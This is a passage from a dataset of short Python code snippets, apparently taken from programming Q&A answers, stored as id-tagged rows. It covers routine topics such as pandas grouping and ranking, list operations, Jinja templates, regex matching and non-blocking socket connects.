</snippet></ROW><ROW><id>20476226</id><snippet>render_template('chooser.html')</snippet></ROW><ROW><id>20476226</id><snippet>{% for o in option_list %}
    ....
{% endfor %}
</snippet></ROW><ROW><id>20476226</id><snippet>option_list</snippet></ROW><ROW><id>20476226</id><snippet>option_list</snippet></ROW><ROW><id>20476226</id><snippet>return render_template('chooser.html', option_list=option_list)
</snippet></ROW><ROW><id>20476226</id><snippet>&lt;select name="option" width="300px"&gt;
{% for o in option_list %}
    &lt;option name="{{ o.optid }}" SELECTED&gt;{{ o.optid }}&lt;/option&gt;
    &lt;/select&gt;
&lt;/td&gt;
&lt;td&gt;
    &lt;input class="button1" type="submit" value="Select"&gt;
&lt;/td&gt;
{% endfor %}
</snippet></ROW><ROW><id>20476226</id><snippet>&lt;select name="option" width="300px"&gt;
{% for o in option_list %}
    &lt;option name="{{ o.optid }}" SELECTED&gt;{{ o.optid }}&lt;/option&gt;

&lt;/select&gt;
&lt;/td&gt;
&lt;td&gt;
    &lt;input class="button1" type="submit" value="Select"&gt;
&lt;/td&gt;
</snippet></ROW><ROW><id>20476474</id><snippet>unicode_escape</snippet></ROW><ROW><id>20476474</id><snippet>&gt;&gt;&gt; data = "\r\n\tSoci\u00e9t\u00e9 implant\u00e9 dans l'internet recrute des t\u00e9l\u00e9conseillers en b to b pour effectuer de la prise de rendez-vous qualifi\u00e9 pour de la conception de site internet et du r\u00e9f\u00e9rencement google."
&gt;&gt;&gt; data.decode('unicode_escape')
u"\r\n\tSoci\xe9t\xe9 implant\xe9 dans l'internet recrute des t\xe9l\xe9conseillers en b to b pour effectuer de la prise de rendez-vous qualifi\xe9 pour de la conception de site internet et du r\xe9f\xe9rencement google."
&gt;&gt;&gt; print data.decode('unicode_escape')

    Société implanté dans l'internet recrute des téléconseillers en b to b pour effectuer de la prise de rendez-vous qualifié pour de la conception de site internet et du référencement google.
</snippet></ROW><ROW><id>20476474</id><snippet>io.open()</snippet></ROW><ROW><id>20476474</id><snippet>open()</snippet></ROW><ROW><id>20476474</id><snippet>from io import open

with open(filename, 'r', encoding="unicode_escape") as inputfile:
    for line in inputfile:
        print(inputfile)
</snippet></ROW><ROW><id>20476474</id><snippet>\uhhhh</snippet></ROW><ROW><id>20476651</id><snippet>extend</snippet></ROW><ROW><id>20476651</id><snippet>append</snippet></ROW><ROW><id>20476651</id><snippet>&gt;&gt;&gt; a = [1,2]
&gt;&gt;&gt; a.extend([3,4])
&gt;&gt;&gt; a
[1, 2, 3, 4]
&gt;&gt;&gt; b = [1,2]
&gt;&gt;&gt; b.append([3,4])
&gt;&gt;&gt; b
[1, 2, [3, 4]]
</snippet></ROW><ROW><id>20476651</id><snippet>extend</snippet></ROW><ROW><id>20476651</id><snippet>os.listdir</snippet></ROW><ROW><id>20476651</id><snippet>products = os.listdir(dir_path)
</snippet></ROW><ROW><id>20476651</id><snippet>for idx, product in enumerate(products):
    print "%d %s" % ((index+1),product)
</snippet></ROW><ROW><id>20476651</id><snippet>enumerate</snippet></ROW><ROW><id>20476773</id><snippet>Pool.map()</snippet></ROW><ROW><id>20476773</id><snippet>def map(self, func, iterable, chunksize=None):
</snippet></ROW><ROW><id>20476773</id><snippet>Pool.map()</snippet></ROW><ROW><id>20476773</id><snippet>Pool.map()</snippet></ROW><ROW><id>20476773</id><snippet>multiprocessing.Process()</snippet></ROW><ROW><id>20477111</id><snippet>'list'</snippet></ROW><ROW><id>20477111</id><snippet>List[2][0][3]</snippet></ROW><ROW><id>20477140</id><snippet>query = "INSERT INTO round1 (details) VALUES (%s)"
c = conn.cursor()
c.executemany(query, [(r,) for r in results])
</snippet></ROW><ROW><id>20477140</id><snippet>INSERT</snippet></ROW><ROW><id>20477140</id><snippet>results</snippet></ROW><ROW><id>20477140</id><snippet>cursor.executemany()</snippet></ROW><ROW><id>20477140</id><snippet>cursor.executemany()</snippet></ROW><ROW><id>20477140</id><snippet>INSERT</snippet></ROW><ROW><id>20477198</id><snippet>l = ['0.234 sil', '0.433 dh', '0.822 ax', '1.122 t', '1.45 r', '1.890 ih', '2.302 p']
val, tok = zip(*map(str.split, l))
val = map(float, val)
</snippet></ROW><ROW><id>20477198</id><snippet>tok_from_to = ['-'.join(tok[max(i-3, 0): min(i, len(l))]) for i in range(2, len(l)+2)]
# ['sil-dh', 'sil-dh-ax', 'dh-ax-t', 'ax-t-r', 't-r-ih', 'r-ih-p', 'ih-p']
val_from = [0] + val[:-1]
val_to = val[2:] + [end_point]*2
</snippet></ROW><ROW><id>20477198</id><snippet>zip(tok_from_to, val_from, val_to)
# [('sil-dh', 0, 0.822), ('sil-dh-ax', 0.234, 1.122), ('dh-ax-t', 0.433, 1.45), ('ax-t-r', 0.822, 1.89), ('t-r-ih', 1.122, 2.302), ('r-ih-p', 1.45, 2.56), ('ih-p', 1.89, 2.56)]
</snippet></ROW><ROW><id>20477211</id><snippet>&gt;&gt;&gt; import socket, errno, os, time, select
&gt;&gt;&gt; sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&gt;&gt;&gt; sock.setblocking(0)
&gt;&gt;&gt; err = sock.connect_ex(('10.0.0.1', 12345))
&gt;&gt;&gt; import errno
&gt;&gt;&gt; print errno.errorcode[err]
EINPROGRESS
&gt;&gt;&gt; print sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
61
&gt;&gt;&gt; print errno.errorcode[61]
ECONNREFUSED
</snippet></ROW><ROW><id>20477211</id><snippet>select()</snippet></ROW><ROW><id>20477211</id><snippet>select()</snippet></ROW><ROW><id>20477211</id><snippet>&gt;&gt;&gt; ready_to_read, ready_to_write, in_error = select.select([], [sock], [])
</snippet></ROW><ROW><id>20477211</id><snippet>&gt;&gt;&gt; print in_error
[]
&gt;&gt;&gt; print ready_to_read
[]
&gt;&gt;&gt; print ready_to_write
[&lt;socket._socketobject object at 0x10ccd0980&gt;]
</snippet></ROW><ROW><id>20477211</id><snippet>select()</snippet></ROW><ROW><id>20477211</id><snippet>select()</snippet></ROW><ROW><id>20477211</id><snippet>getsockopt()</snippet></ROW><ROW><id>20477349</id><snippet>any()</snippet></ROW><ROW><id>20477349</id><snippet>[d for d in inputlist if any(d.itervalues())]
</snippet></ROW><ROW><id>20477349</id><snippet>any(d.values())</snippet></ROW><ROW><id>20477349</id><snippet>any()</snippet></ROW><ROW><id>20477349</id><snippet>True</snippet></ROW><ROW><id>20477349</id><snippet>d.itervalues()</snippet></ROW><ROW><id>20477349</id><snippet>&gt;&gt;&gt; inputlist = [{'Key1': 'JJ', 'Key2': 'GG', 'Key3':''}, {'Key1': '', 'Key2': '', 'Key3': ''}, {'Key1': '', 'Key2': 'GG', 'Key3': ''}, {'Key1': '', 'Key2': '', 'Key3': ''}]
&gt;&gt;&gt; [d for d in inputlist if any(d.itervalues())]
[{'Key3': '', 'Key2': 'GG', 'Key1': 'JJ'}, {'Key3': '', 'Key2': 'GG', 'Key1': ''}]
</snippet></ROW><ROW><id>20477349</id><snippet>None</snippet></ROW><ROW><id>20477349</id><snippet>0</snippet></ROW><ROW><id>20477349</id><snippet>[d for d in inputlist if any(v != '' for v in d.itervalues())]
</snippet></ROW><ROW><id>20477356</id><snippet>&gt;&gt;&gt; import itertools
&gt;&gt;&gt; l2 = ['a','b','c']
&gt;&gt;&gt; l1 = [1, 2]
&gt;&gt;&gt; list(itertools.izip_longest(l1, l2))
[(1, 'a'), (2, 'b'), (None, 'c')]
</snippet></ROW><ROW><id>20477551</id><snippet>StartTime</snippet></ROW><ROW><id>20477551</id><snippet>## batch table ##
      BatchNo             StartTime
0  BATCH23797   2013-09-06 02:22:00
1  BATCH23798   2013-09-06 06:06:00
2  BATCH23799   2013-09-06 14:33:00
3  BATCH23800   2013-09-06 18:12:00
4  BATCH23801  2013-09-06 21:38:00 

## event table ##
              DateTime  Event A Flag  Event B Flag
0  2013-09-06 03:20:18             1             1
1  2013-09-06 12:09:50             1             0
2  2013-09-06 13:19:45             1             0
3  2013-09-06 19:09:35             1             1
</snippet></ROW><ROW><id>20477551</id><snippet>batch</snippet></ROW><ROW><id>20477551</id><snippet>event</snippet></ROW><ROW><id>20477551</id><snippet>Event B flag</snippet></ROW><ROW><id>20477551</id><snippet>event.DateTime</snippet></ROW><ROW><id>20477551</id><snippet>batch.StartTime</snippet></ROW><ROW><id>20477551</id><snippet>bisect</snippet></ROW><ROW><id>20477551</id><snippet>batch</snippet></ROW><ROW><id>20477551</id><snippet>import bisect
# a helper function to perform binary search
hit_idx = lambda x: bisect.bisect_left( batch.StartTime, x ) - 1

idx = event.DateTime.map( hit_idx )
event[ 'BatchNo' ] = map( batch.BatchNo.get, idx )
</snippet></ROW><ROW><id>20477551</id><snippet>              DateTime  Event A Flag  Event B Flag     BatchNo
0  2013-09-06 03:20:18             1             1  BATCH23797
1  2013-09-06 12:09:50             1             0  BATCH23798
2  2013-09-06 13:19:45             1             0  BATCH23798
3  2013-09-06 19:09:35             1             1  BATCH23800
</snippet></ROW><ROW><id>20477551</id><snippet>BatchNo</snippet></ROW><ROW><id>20477551</id><snippet>pv = event.groupby( 'BatchNo' )['Event A Flag', 'Event B Flag'].aggregate( sum )
</snippet></ROW><ROW><id>20477551</id><snippet>            Event A Flag  Event B Flag
BatchNo                               
BATCH23797             1             1
BATCH23798             2             0
BATCH23800             1             1
</snippet></ROW><ROW><id>20477551</id><snippet>BATCH23798</snippet></ROW><ROW><id>20477551</id><snippet>pv.ix[ 'BATCH23798' ]
</snippet></ROW><ROW><id>20477551</id><snippet>Event A Flag    2
Event B Flag    0
</snippet></ROW><ROW><id>20477551</id><snippet>pv.reindex( batch.BatchNo ).fillna( 0 )
</snippet></ROW><ROW><id>20477551</id><snippet>            Event A Flag  Event B Flag
BatchNo                               
BATCH23797             1             1
BATCH23798             2             0
BATCH23799             0             0
BATCH23800             1             1
BATCH23801             0             0
</snippet></ROW><ROW><id>20477758</id><snippet>from itertools import groupby

for _, group in groupby(not_shuffled_deck, lambda c: c.split()[0]):
    print '| '.join(group)
    print
</snippet></ROW><ROW><id>20477758</id><snippet>&gt;&gt;&gt; from itertools import groupby
&gt;&gt;&gt; not_shuffled_deck = ["%i of %s" % (i, s) for i in range(2,10) for s in ('spades', 'diamonds', 'clubs', 'hearts')]
&gt;&gt;&gt; for _, group in groupby(not_shuffled_deck, lambda c: c.split()[0]):
...     print '| '.join(group)
...     print
... 
2 of spades| 2 of diamonds| 2 of clubs| 2 of hearts

3 of spades| 3 of diamonds| 3 of clubs| 3 of hearts

4 of spades| 4 of diamonds| 4 of clubs| 4 of hearts

5 of spades| 5 of diamonds| 5 of clubs| 5 of hearts

6 of spades| 6 of diamonds| 6 of clubs| 6 of hearts

7 of spades| 7 of diamonds| 7 of clubs| 7 of hearts

8 of spades| 8 of diamonds| 8 of clubs| 8 of hearts

9 of spades| 9 of diamonds| 9 of clubs| 9 of hearts
</snippet></ROW><ROW><id>20477862</id><snippet>def sorted(s, num):
    tmp = s.order(ascending=False)[:num]
    tmp.index = range(num)
    return tmp
</snippet></ROW><ROW><id>20477862</id><snippet>In [1]: data.apply(lambda x: sorted(x, 3))
Out[1]:
   first  second  third
0     89      76     98
1     56      45     87
2     40      45     67
</snippet></ROW><ROW><id>20477871</id><snippet>mail</snippet></ROW><ROW><id>20477871</id><snippet>  File "....", line 27, in mail
</snippet></ROW><ROW><id>20477871</id><snippet>mail</snippet></ROW><ROW><id>20477871</id><snippet>Mail()</snippet></ROW><ROW><id>20477871</id><snippet>Mail()</snippet></ROW><ROW><id>20477871</id><snippet>send_mail</snippet></ROW><ROW><id>20477871</id><snippet>def send_mail():
    email = request.args.get('email')
    name = request.args.get('name')
    message = request.args.get('message')
    msg = Message("Message from your site",
                  sender=email,
                  recipients=["aaronwishnick@gmail.com"])
    msg.body = message
    mail.send(msg)
</snippet></ROW><ROW><id>20477936</id><snippet>re</snippet></ROW><ROW><id>20477936</id><snippet>import re

template = re.compile(r'^name_is_here_(\d+)_20131204.txt$')

testList = ['name_is_here_100_20131204.txt', #accepted
            'name_is_here_100_20131204.txt.NEW', #rejected!
            'name_is_here_aabs2352_20131204.txt', #rejected!
            'other_name.txt'] #rejected!

acceptList = [item for item in testList if template.match(item)]
</snippet></ROW><ROW><id>20478181</id><snippet>!</snippet></ROW><ROW><id>20478181</id><snippet>+</snippet></ROW><ROW><id>20478181</id><snippet>~/.vim</snippet></ROW><ROW><id>20478189</id><snippet>self.Attribute1 = (randint(w,x), randint(y,z))</snippet></ROW><ROW><id>20478189</id><snippet>Attribute1[0]</snippet></ROW><ROW><id>20478189</id><snippet>Attribute1[1]</snippet></ROW><ROW><id>20478189</id><snippet>RandomObjectA</snippet></ROW><ROW><id>20478189</id><snippet>RandomObjectB</snippet></ROW><ROW><id>20478189</id><snippet>RandomObjectX</snippet></ROW><ROW><id>20478451</id><snippet>def algae(S, n):
    """
    Print S rewritten with the algae rule to recursion depth n
    """
    al = {'A': 'AB', 'B': 'A'}
    if n == 0:
        return S
    # Make a new string to build on
    mystr = ""
    for symbol in S:
        # Add the translation to the new string
        mystr += al[symbol]
    # Recursively call the function, passing in the string
    return algae(mystr, n-1)

print(algae('A', 5))
</snippet></ROW><ROW><id>20478451</id><snippet>ABAABABAABAAB
</snippet></ROW><ROW><id>20478451</id><snippet>def algae(S, n):
    """
    Print S rewritten with the algae rule to recursion depth n
    """
    al = {'A': 'AB', 'B': 'A'}
    if n == 0:
        return S
    mystr = "".join(al[c] for c in S)
    return algae(mystr, n-1)

print(algae('A', 5))
</snippet></ROW><ROW><id>20478493</id><snippet>def match_strings(lastname, listofnames):
    firstCaseMatched = [name for name in listofnames if lastname[0] == name[0]]
    if len(firstCaseMatched):
        matchedidx = [index for index, ame in enumerate(firstCaseMatched) if Levenshtein.distance(lastname, name) &lt; 2]
        match = len(matchedidx)
    else:
        match = 0
    if match == 1:
        newnamelist = [i for j, i in enumerate(listofnames) if j not in matchedidx]
        return 1, newnamelist
    return 0, listofnames
</snippet></ROW><ROW><id>20478755</id><snippet>i</snippet></ROW><ROW><id>20478755</id><snippet>n</snippet></ROW><ROW><id>20478755</id><snippet>for i in range(n):
    print i+1, "\t", log10(i+1)
</snippet></ROW><ROW><id>20478883</id><snippet>gene = this_re.group(1)
</snippet></ROW><ROW><id>20478883</id><snippet>gene = info[this_re.start(0):this_re.end(0)]
</snippet></ROW><ROW><id>20478883</id><snippet>re</snippet></ROW><ROW><id>20478883</id><snippet>N</snippet></ROW><ROW><id>20478883</id><snippet>re._MAXCACHE</snippet></ROW><ROW><id>20478883</id><snippet>N</snippet></ROW><ROW><id>20478919</id><snippet>apple</snippet></ROW><ROW><id>20478919</id><snippet>smallist</snippet></ROW><ROW><id>20478919</id><snippet>smallist</snippet></ROW><ROW><id>20478919</id><snippet>for i, nested in enumerate(smallist):
    if item in nested:
        print(i)
        break
</snippet></ROW><ROW><id>20478919</id><snippet>enumerate()</snippet></ROW><ROW><id>20478919</id><snippet>smallist</snippet></ROW><ROW><id>20478919</id><snippet>for name, count in smallist:
    if name == item:
        print(count)
        break
</snippet></ROW><ROW><id>20478919</id><snippet>small_dict = dict(smallist)
print(small_dict.get(item, 'Not found'))
</snippet></ROW><ROW><id>20478972</id><snippet>{
    'Bob': {'assignment': 'Test1', grade: 99},
    'John': {'assignment': 'Worksheet', grade: 39}
}
</snippet></ROW><ROW><id>20479216</id><snippet>splitstring = [float(s) for s in splitstring]
</snippet></ROW><ROW><id>20479216</id><snippet>map()</snippet></ROW><ROW><id>20479216</id><snippet>splitstring = map(float, splitstring)
</snippet></ROW><ROW><id>20479216</id><snippet>c</snippet></ROW><ROW><id>20479216</id><snippet>'500'</snippet></ROW><ROW><id>20479216</id><snippet>enumerate()</snippet></ROW><ROW><id>20479216</id><snippet>for i, value in enumerate(splitstring):
    splitstring[i] = float(value)
</snippet></ROW><ROW><id>20479216</id><snippet>for c in range(len(splitstring)):</snippet></ROW><ROW><id>20479216</id><snippet>map()</snippet></ROW><ROW><id>20479263</id><snippet>keywords = ['tabrakan', 'di' ,'antara', 'tewas', 'luka', 'selamat']
for line in data:
    if any(k in line for k in keywords):
        print line
</snippet></ROW><ROW><id>20479345</id><snippet>break</snippet></ROW><ROW><id>20479345</id><snippet>for</snippet></ROW><ROW><id>20479345</id><snippet>range()</snippet></ROW><ROW><id>20479345</id><snippet>for attempt in range(5):
    password = input("Password: ")
    if password == "changeme":
        print("Thou Shall Pass Into Mordor")
        break
else:
    print("Thou Shall Not Pass Into Mordor")
</snippet></ROW><ROW><id>20479345</id><snippet>else</snippet></ROW><ROW><id>20479345</id><snippet>for</snippet></ROW><ROW><id>20479345</id><snippet>break</snippet></ROW><ROW><id>20479345</id><snippet>&gt;&gt;&gt; # Five failed attempts
...
&gt;&gt;&gt; for attempt in range(5):
...     password = input("Password: ")
...     if password == "changeme":
...         print("Thou Shall Pass Into Mordor")
...         break
... else:
...     print("Thou Shall Not Pass Into Mordor")
... 
Password: You shall not pass!
Password: One doesn't simply walk into Mordor!
Password: That sword was broken!
Password: It has been remade!
Password: &lt;whispered&gt; Toss me!
Thou Shall Not Pass Into Mordor
&gt;&gt;&gt; # Successful attempt after one failure
...
&gt;&gt;&gt; for attempt in range(5):
...     password = input("Password: ")
...     if password == "changeme":
...         print("Thou Shall Pass Into Mordor")
...         break
... else:
...     print("Thou Shall Not Pass Into Mordor")
... 
Password: They come in pints?! I'm having one!
Password: changeme
Thou Shall Pass Into Mordor
</snippet></ROW><ROW><id>20479416</id><snippet>return redirect(item.get_absolute_url() + '#hash')
</snippet></ROW><ROW><id>20479433</id><snippet>except Exception as e:
    print("Error has occurred", e)
</snippet></ROW><ROW><id>20479469</id><snippet>[start:stop]</snippet></ROW><ROW><id>20479469</id><snippet>[start:count]</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][4:4+1]</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][4:5]</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][:4] = "456-"
lijst[1][4:] = "Def"
</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][:4] + lijst[1][4:] == lijst[1]
</snippet></ROW><ROW><id>20479469</id><snippet>stop-start</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][2:6] = "6-De"
</snippet></ROW><ROW><id>20479469</id><snippet>6 - 2 = 4</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][0:7:2] = "46Df"
</snippet></ROW><ROW><id>20479469</id><snippet>lijst[1][::2]
</snippet></ROW><ROW><id>20479955</id><snippet>            Rectangle:
                size: 400,400                   # this is /not/ centered
                Label:
                    text: unicode(self.size)    # this is /not/ appearing
                    color: 1,0,0,1
</snippet></ROW><ROW><id>20479969</id><snippet>enumerate</snippet></ROW><ROW><id>20479969</id><snippet>&gt;&gt;&gt; a = [[0,1,2],[0,0,0],[1,1,1]]
&gt;&gt;&gt; [i for i, x in enumerate(a, 1) if 2 not in x]
[2, 3]
</snippet></ROW><ROW><id>20480019</id><snippet>in</snippet></ROW><ROW><id>20480019</id><snippet>if symbol in reps:
    print("You already defined that symbol")
</snippet></ROW><ROW><id>20480019</id><snippet>if letter in reps.values():
    print("You already defined that letter")
</snippet></ROW><ROW><id>20480019</id><snippet>if symbol in reps or letter in reps.values():
    print("You already used either the symbol or the letter")
</snippet></ROW><ROW><id>20480085</id><snippet>"%02x"</snippet></ROW><ROW><id>20480095</id><snippet>%</snippet></ROW><ROW><id>20480095</id><snippet>content</snippet></ROW><ROW><id>20480095</id><snippet>content=r'''\documentclass{article}
\usepackage{graphicx,amsmath}

\begin{document}
\noindent\rotatebox{180}{\vbox{%%
    %(equation)s
    }%%
}
\end{document}
'''
</snippet></ROW><ROW><id>20480095</id><snippet>%</snippet></ROW><ROW><id>20480095</id><snippet>\noindent\rotatebox{180}{\vbox{%</snippet></ROW><ROW><id>20480095</id><snippet>\n</snippet></ROW><ROW><id>20480508</id><snippet>In [1]: df.sum(axis=1).order(ascending=False).head(3)
Out[1]:
Banana    219
Grape     201
Apple     151
</snippet></ROW><ROW><id>20480508</id><snippet>In [2]: idx = df.sum(axis=1).order(ascending=False).head(3).index

In [3]: df.ix[idx]
Out[3]:
        day1  day2  day3
Banana    56    76    87
Grape     89    45    67
Apple     40    13    98
</snippet></ROW><ROW><id>20480683</id><snippet>from thirdparty import FooClass

orig_foo_method = FooClass.foo_method

def new_foo_method(self):
    # do new stuff
    # perhaps even call orig_foo_method(self)

FooClass.foo_method = new_foo_method
</snippet></ROW><ROW><id>20480683</id><snippet>.foo_method()</snippet></ROW><ROW><id>20480683</id><snippet>FooClass</snippet></ROW><ROW><id>20480683</id><snippet>new_foo_method()</snippet></ROW><ROW><id>20480970</id><snippet>1</snippet></ROW><ROW><id>20480970</id><snippet>cds_score[score].add(id)
</snippet></ROW><ROW><id>20480970</id><snippet>defaultdict</snippet></ROW><ROW><id>20480970</id><snippet>dict.setdefault</snippet></ROW><ROW><id>20480970</id><snippet>cds_score.setdefault(score, set()).add(id)
</snippet></ROW><ROW><id>20480970</id><snippet>cds_score[score] = id
</snippet></ROW><ROW><id>20480970</id><snippet>id</snippet></ROW><ROW><id>20480970</id><snippet>score</snippet></ROW><ROW><id>20481009</id><snippet>&gt;&gt;&gt; letters = ['h','e','l','l','o']

&gt;&gt;&gt; mystr = ' '.join(letters)

&gt;&gt;&gt; print mystr

'h e l l o'
</snippet></ROW><ROW><id>20481009</id><snippet>mystr = ''
# this keeps the whole operation within the for loop
for i in range(len(letters)):
    mystr += letters[i] + ' '
    if i == len(letters)-1: # this condition will be tested each iteration, but it seemed more in keeping with your question
        mystr = mystr[:-1] 
</snippet></ROW><ROW><id>20481080</id><snippet>pd.DatetimeIndex(montdist['date']) + pd.DateOffset(1)
</snippet></ROW><ROW><id>20481080</id><snippet>In [11]: df = pd.DataFrame([[1, 2], [3, 4]], columns=['A', 'B'])

In [12]: df['date'] = pd.to_datetime(['21-11-2013', '22-11-2013'])

In [13]: pd.DatetimeIndex(df.date) + pd.DateOffset(1)
Out[13]: 
&lt;class 'pandas.tseries.index.DatetimeIndex'&gt;
[2013-11-22 00:00:00, 2013-11-23 00:00:00]
Length: 2, Freq: None, Timezone: None

In [14]: pd.DatetimeIndex(df.date) + pd.offsets.Hour(1)
Out[14]: 
&lt;class 'pandas.tseries.index.DatetimeIndex'&gt;
[2013-11-21 01:00:00, 2013-11-22 01:00:00]
Length: 2, Freq: None, Timezone: Non
</snippet></ROW><ROW><id>20481138</id><snippet>rank</snippet></ROW><ROW><id>20481138</id><snippet>In [11]: df.a.rank()
Out[11]: 
0     4
1     1
2     8
3    10
4     6
5     2
6     3
7     9
8     7
9     5
Name: a, dtype: float64
</snippet></ROW><ROW><id>20481138</id><snippet>In [12]: df.a.rank(ascending=False)
Out[12]: 
0     7
1    10
2     3
3     1
4     5
5     9
6     8
7     2
8     4
9     6
Name: a, dtype: float64
</snippet></ROW><ROW><id>20481138</id><snippet>In [21]: df = pd.DataFrame(np.random.randint(1, 5, (10, 2)), columns=list('ab'))

In [22]: df
Out[22]: 
   a  b
0  2  2
1  3  4
2  1  1
3  3  1
4  4  2
5  2  4
6  1  4
7  2  1
8  1  2
9  3  4

In [23]: df.a.rank()  # there are several 2s (which have rank 5)
Out[23]: 
0     5
1     8
2     2
3     8
4    10
5     5
6     2
7     5
8     2
9     8
Name: a, dtype: float64

In [24]: df.a.rank(method='first')
Out[24]: 
0     4
1     7
2     1
3     8
4    10
5     5
6     2
7     6
8     3
9     9
Name: a, dtype: float64
</snippet></ROW><ROW><id>20481222</id><snippet>{..}</snippet></ROW><ROW><id>20481222</id><snippet>str.format</snippet></ROW><ROW><id>20481222</id><snippet>&gt;&gt;&gt; expression = '{a}*{b}'
&gt;&gt;&gt; values = {'a': 10, 'b': 20, 'c': 30} 
&gt;&gt;&gt; expression.format(**values)
'10*20'
</snippet></ROW><ROW><id>20481222</id><snippet>table.get</snippet></ROW><ROW><id>20481222</id><snippet>&gt;&gt;&gt; import re
&gt;&gt;&gt; regexp = re.compile('{(.*?)}')
&gt;&gt;&gt; keys = regexp.findall(expression)
&gt;&gt;&gt; keys
['a', 'b']
&gt;&gt;&gt; table_get = lambda *x: np.random.randint(5)
&gt;&gt;&gt; values = {k: table_get(k) for k in keys}
&gt;&gt;&gt; expression.format(**values)
'1*4'
</snippet></ROW><ROW><id>20481236</id><snippet>url</snippet></ROW><ROW><id>20481236</id><snippet>{% url employee_new %}</snippet></ROW><ROW><id>20481279</id><snippet>class TimeElapser  :
   def __init__(self, function_to_wrap) :
       self.__call__ = function_to_wrap
       self.get_duration = get_duration(function_to_wrap)
</snippet></ROW><ROW><id>20481279</id><snippet>class Foo :

    @TimeElapser
    def do_something(self, ....) :
       ...

foo = Foo()
foo.do_something() #Does something
foo.do_something.get_duration() # Does something and print duration
</snippet></ROW><ROW><id>20481489</id><snippet>hit_or_stay(hand_two)
</snippet></ROW><ROW><id>20481489</id><snippet>deal_one_card(person)
value_of_current_cards(person)
number_value_of_hand()
</snippet></ROW><ROW><id>20481489</id><snippet>number_value_of_hand()</snippet></ROW><ROW><id>20481489</id><snippet>number_value_of_hand()</snippet></ROW><ROW><id>20481489</id><snippet>list</snippet></ROW><ROW><id>20481489</id><snippet>number_of_hands(hands[i])</snippet></ROW><ROW><id>20481489</id><snippet>i</snippet></ROW><ROW><id>20481644</id><snippet>collections.defaultdict</snippet></ROW><ROW><id>20481644</id><snippet>from collections import defaultdict
def get_wins_by_category(team_to_win, category):

    d = {'name':0, 'city':1, 'sport':2}
    dic = defaultdict(int)
    for k, v in team_to_win.items():
        dic[k[d[category]]] += v
    return dic
... 
&gt;&gt;&gt; get_wins_by_category(d, 'city')
defaultdict(&lt;type 'int'&gt;, {'Toronto': 34, 'Ottawa': 45})
&gt;&gt;&gt; get_wins_by_category(d, 'sport')
defaultdict(&lt;type 'int'&gt;, {'basketball': 31, 'hockey': 48})
&gt;&gt;&gt; get_wins_by_category(d, 'name')
defaultdict(&lt;type 'int'&gt;, {'Senators': 45, 'Blues': 21, 'Raptors': 10, 'Leafs': 3})
</snippet></ROW><ROW><id>20481644</id><snippet>collections.Counter</snippet></ROW><ROW><id>20481644</id><snippet>from collections import Counter
def get_wins_by_category(team_to_win, category):
    #index each category points to
    d = {'name':0, 'city':1, 'sport':2}
    dic = Counter()       
    for k, v in team_to_win.items():
        dic[k[d[category]]] += v
    return dic
... 
&gt;&gt;&gt; get_wins_by_category(d, 'city')
Counter({'Ottawa': 45, 'Toronto': 34})
&gt;&gt;&gt; get_wins_by_category(d, 'sport')
Counter({'hockey': 48, 'basketball': 31})
&gt;&gt;&gt; get_wins_by_category(d, 'name')
Counter({'Senators': 45, 'Blues': 21, 'Raptors': 10, 'Leafs': 3})
</snippet></ROW><ROW><id>20481808</id><snippet>timedelta</snippet></ROW><ROW><id>20481808</id><snippet>datetime</snippet></ROW><ROW><id>20481808</id><snippet>datetime</snippet></ROW><ROW><id>20481808</id><snippet>&gt;&gt;&gt; import datetime
&gt;&gt;&gt; now = datetime.datetime.now()
&gt;&gt;&gt; end_time = now + datetime.timedelta(hours=6)
&gt;&gt;&gt; print now
2013-12-09 17:03:06.979628
&gt;&gt;&gt; print end_time
2013-12-09 23:03:06.979628
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>20481808</id><snippet>while datetime.datetime.now() &lt; end_time:
    pass # do work
</snippet></ROW><ROW><id>20481826</id><snippet>octave:9&gt; tx = [ 0 -T(3) T(2)
&gt; T(3) 0 -T(1)
&gt; -T(2) T(1) 0]
tx =

   0.000000   0.028545   0.041492
  -0.028545   0.000000  -0.000165
  -0.041492   0.000165   0.000000

octave:11&gt; E= R* tx
E =

  -2.1792e-04   2.8546e-02   4.1491e-02
  -4.8255e-02   4.6088e-05  -2.1160e-04
   1.4415e-02   1.1148e-04   2.4526e-04

octave:12&gt; F=inv(M1')*E*inv(M2)
F =

  -3.6731e-10   4.8113e-08   2.4320e-05
  -8.1333e-08   7.7681e-11   6.7289e-05
   7.0206e-05  -3.7128e-05  -7.6583e-02

octave:14&gt; rank(F)
ans =  2
</snippet></ROW><ROW><id>20482003</id><snippet>A = [1,2,3,4,5,6,7,8]
A[0:4]
A[4:8]
</snippet></ROW><ROW><id>20482139</id><snippet>&lt;img src="{{ MEDIA_URL }}{{ dj.img }}"&gt;</snippet></ROW><ROW><id>20482157</id><snippet>#!/usr/bin/env python
</snippet></ROW><ROW><id>20482157</id><snippet>chmod +x scriptname.py</snippet></ROW><ROW><id>20482501</id><snippet>sys.modules</snippet></ROW><ROW><id>20482672</id><snippet>match = re.search($not($eq(metadata["albumartistsort"],metadata["albumartist"])))
</snippet></ROW><ROW><id>20482672</id><snippet>$not</snippet></ROW><ROW><id>20482672</id><snippet>$eq</snippet></ROW><ROW><id>20482672</id><snippet>==</snippet></ROW><ROW><id>20482672</id><snippet>re.search</snippet></ROW><ROW><id>20482672</id><snippet>-d</snippet></ROW><ROW><id>20482672</id><snippet>/Applications/MusicBrainz Picard.app/Contents/MacOS/MusicBrainz Picard</snippet></ROW><ROW><id>20482672</id><snippet>picard</snippet></ROW><ROW><id>20482672</id><snippet>sys.path</snippet></ROW><ROW><id>20482672</id><snippet>picard</snippet></ROW><ROW><id>20482672</id><snippet>print</snippet></ROW><ROW><id>20482672</id><snippet>logging</snippet></ROW><ROW><id>20482672</id><snippet>re</snippet></ROW><ROW><id>20482672</id><snippet>if</snippet></ROW><ROW><id>20482672</id><snippet>def copy_albumartist_to_albumartistsort(tagger, metadata, release):
    metadata["albumartistsort"] = metadata["albumartist"]

def copy_artist_to_artistsort(tagger, metadata, release, track):
    metadata["artistsort"] = metadata["artist"]

register_album_metadata_processor(copy_albumartist_to_albumartistsort)
register_track_metadata_processor(copy_artist_to_artistsort)
